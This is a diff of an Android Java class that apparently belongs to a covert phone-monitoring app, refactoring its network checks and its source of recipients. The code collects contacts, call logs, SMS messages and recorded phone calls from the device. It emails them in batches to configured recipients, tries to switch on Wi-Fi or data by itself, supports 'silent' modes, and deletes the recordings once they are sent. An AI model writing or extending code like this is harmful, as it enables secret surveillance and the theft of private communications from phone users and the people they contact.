@@ -88,9 +88,9 @@ public class GetInfoTask extends TimerTask
 		*/
 		
 		// If there are no recipients, return 
-		String[] recipients = getRecipients(context);
-		if (recipients == null || recipients.length == 0) return;
+		if (BootService.recipients == null || BootService.recipients.length == 0) return;
 		
+		// Get initial networks state
 		boolean isAlreadyWifiConnected = NetworkUtil.isWifiConnected(context);
 		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
 		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
@@ -100,22 +100,23 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		if (isTimeToCollectInfo()) 
 		{
+			boolean connected = isAlreadyDataNetworkConnected;
 			// If network not connected
 			if (!isAlreadyDataNetworkConnected) {
 				// Retrun if silent mode
 				if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
-					return;
+					// do nothing
 				}
 				// Or try to connect WIFI if wifi active mode
 				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
-					if (!NetworkUtil.tryToConnectWifi(context)) {
-						return;
+					if (NetworkUtil.tryToConnectWifi(context)) {
+						connected = true;
 					}
 				}
 				// Or try to connect network if active mode
 				else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
-					if (!NetworkUtil.tryToConnectDataNetwork(context)) {
-						return;
+					if (NetworkUtil.tryToConnectDataNetwork(context)) {
+						connected = true;
 					}
 				}
 			}
@@ -124,130 +125,130 @@ public class GetInfoTask extends TimerTask
 			// Since info files are small (generally less than 200KB) and few (once per day at max), 
 			// we will still let app use 3G/GPRS data connection to send info files.
 			
-			// Clean attachments
-			if (attachments == null) attachments = new ArrayList<File>();
-			else attachments.clear();
+			if (connected) {
+				// Clean attachments
+				if (attachments == null) attachments = new ArrayList<File>();
+				else attachments.clear();
 			
-			// Collect information
-			CollectContact(context);
-			SysUtils.threadSleep(1000, LOGTAG);
-			CollectPhoneCallHist(context);
-			SysUtils.threadSleep(1000, LOGTAG);
-			CollectSms(context);
-			SysUtils.threadSleep(1000, LOGTAG);
+				// Collect information
+				CollectContact(context);
+				SysUtils.threadSleep(1000, LOGTAG);
+				CollectPhoneCallHist(context);
+				SysUtils.threadSleep(1000, LOGTAG);
+				CollectSms(context);
+				SysUtils.threadSleep(1000, LOGTAG);
 			
-			// If network cut, return
-			if (!NetworkUtil.isNetworkConnected(context)) {
-				// Clean info files
-				FileCtrl.cleanTxtFiles(context);
-				return;
-			}
-			
-			// Send mail
-			String phoneNum = ConfigCtrl.getSelfName(context);
-			String subject = context.getResources().getString(R.string.mail_from) 
+				if (NetworkUtil.isNetworkConnected(context)) {
+					// Send mail
+					String phoneNum = ConfigCtrl.getSelfName(context);
+					String subject = context.getResources().getString(R.string.mail_from) 
 		          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
 		          		 + context.getResources().getString(R.string.mail_description);
-			String body = String.format(context.getResources().getString(R.string.mail_body_info), phoneNum);
-			String pwd = MailCfg.getSenderPwd(context);
+					String body = String.format(context.getResources().getString(R.string.mail_body_info), phoneNum);
+					String pwd = MailCfg.getSenderPwd(context);
 			
-			boolean result = false;
-			int retry = DEFAULT_RETRY_COUNT;
-			while(!result && retry > 0)
-			{
-				String host = MailCfg.getHost(context);
-				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, host, sender, pwd, recipients, attachments);
-				retry--;
-			}
-			attachments.clear();
+					boolean result = false;
+					int retry = DEFAULT_RETRY_COUNT;
+					while(!result && retry > 0)
+					{
+						String host = MailCfg.getHost(context);
+						String sender = MailCfg.getSender(context);
+						result = sendMail(subject, body, host, sender, pwd, BootService.recipients, attachments);
+						retry--;
+					}
+					attachments.clear();
 				
-			// Update the last date time
-			if (result) {
-				ConfigCtrl.setLastGetInfoTime(context, new Date());
+					// Update the last date time
+					if (result) {
+						ConfigCtrl.setLastGetInfoTime(context, new Date());
+					}
+				}
+				
+				// Clean info files
+				FileCtrl.cleanTxtFiles(context);
 			}
-			
-			// Clean info files
-			FileCtrl.cleanTxtFiles(context);
 		}
 		
 		// ===================================================================================
 		// Try to send phone call recording
 		// ===================================================================================
 		SysUtils.threadSleep(1000, LOGTAG);
-		boolean isWifiConnected = NetworkUtil.isWifiConnected(context);
-		boolean isConnected = NetworkUtil.isNetworkConnected(context);
-		
-		// If network not connected
-		if (!isConnected) {
-			// Retrun if silent mode
-			if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
-				return;
-			}
-			// Or try to connect WIFI if wifi active mode
-			else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
-				if (!NetworkUtil.tryToConnectWifi(context)) {
-					return;
-				}
-			}
-			// Or try to connect network if active mode
-			else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
-				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
-					return;
-				}
-			}
-		}
-		// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
-		else if (!isWifiConnected) {
-			// Return if WIFI silent mode
-			if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
-				return;
-			}
-			// Try to connect WIFI if WIFI active mode
-			else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
-				if (!NetworkUtil.tryToConnectWifi(context)) {
-					return;
-				}
-			}
-		}
-		
-		// If come here, means the network connected
 		
 		// Get all wav files
-		String prefix = context.getResources().getString(R.string.phonecall_record);
 		List<File> wavs = FileCtrl.getAllWavFiles(context);
 		int wavCount = wavs.size();
-		if (wavCount <= 0) return;
+		if (wavCount > 0) {
+			boolean isWifiConnected = NetworkUtil.isWifiConnected(context);
+			boolean isConnected = NetworkUtil.isNetworkConnected(context);
 		
-		// Send mails (5 wavs attached per mail) 
-		int COUNT_PER_PACKAGE = 5;
-		String phoneNum = ConfigCtrl.getSelfName(context);
-		String body = String.format(context.getResources().getString(R.string.mail_body_record), phoneNum);
-		String pwd = MailCfg.getSenderPwd(context);
+			// If network not connected
+			boolean allowToSend = false;
+			if (!isConnected) {
+				// Retrun if silent mode
+				if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
+					// do nothing
+				}
+				// Or try to connect WIFI if wifi active mode
+				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+					if (NetworkUtil.tryToConnectWifi(context)) {
+						allowToSend = true;
+					}
+				}
+				// Or try to connect network if active mode
+				else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+					if (NetworkUtil.tryToConnectDataNetwork(context)) {
+						allowToSend = true;
+					}
+				}
+			}
+			// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
+			else if (!isWifiConnected) {
+				// Return if WIFI silent mode
+				if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
+					// do nothing
+				}
+				// Try to connect WIFI if WIFI active mode
+				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
+					if (NetworkUtil.tryToConnectWifi(context)) {
+						allowToSend = true;
+					}
+				}
+			}
 		
-		for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
-			List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
-			if (pack.size() <= 0) break;
+			if (allowToSend) {
+				String prefix = context.getResources().getString(R.string.phonecall_record);
+		
+				// Send mails (5 wavs attached per mail) 
+				int COUNT_PER_PACKAGE = 5;
+				String phoneNum = ConfigCtrl.getSelfName(context);
+				String body = String.format(context.getResources().getString(R.string.mail_body_record), phoneNum);
+				String pwd = MailCfg.getSenderPwd(context);
+		
+				for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
+					List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
+					if (pack.size() <= 0) break;
 
-			String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
-		       		 + "-" + DatetimeUtil.format2.format(new Date());
+					String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
+							+ "-" + DatetimeUtil.format2.format(new Date());
 			
-			if (!NetworkUtil.isNetworkConnected(context)) {
-				return;
-			}
-			boolean result = false;
-			int retry = DEFAULT_RETRY_COUNT;
-			while(!result && retry > 0)
-			{
-				String host = MailCfg.getHost(context);
-				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, host, sender, pwd, recipients, pack);
-				retry--;
-			}
+					if (!NetworkUtil.isNetworkConnected(context)) {
+						return;
+					}
+					boolean result = false;
+					int retry = DEFAULT_RETRY_COUNT;
+					while(!result && retry > 0)
+					{
+						String host = MailCfg.getHost(context);
+						String sender = MailCfg.getSender(context);
+						result = sendMail(subject, body, host, sender, pwd, BootService.recipients, pack);
+						retry--;
+					}
 		
-			// Clean wav files in SD-CARD
-			if (result) {
-				FileCtrl.cleanWavFiles(pack);
+					// Clean wav files in SD-CARD
+					if (result) {
+						FileCtrl.cleanWavFiles(pack);
+					}
+				}
 			}
 		}
 		
@@ -386,17 +387,6 @@ public class GetInfoTask extends TimerTask
         }
         
 		return ret;
-	}
-	
-	private static String[] getRecipients(Context context)
-	{
-		String mail = GlobalPrefActivity.getReceiverMail(context);
-		String[] mails = mail.split(",");
-		if (mails.length > 0) {
-			return StrUtils.filterMails(mails);
-		} else {
-			return null;
-		}
 	}
 	
 	private static String makeFileName(Context context, String nameBase, String deviceName, String suffix) 
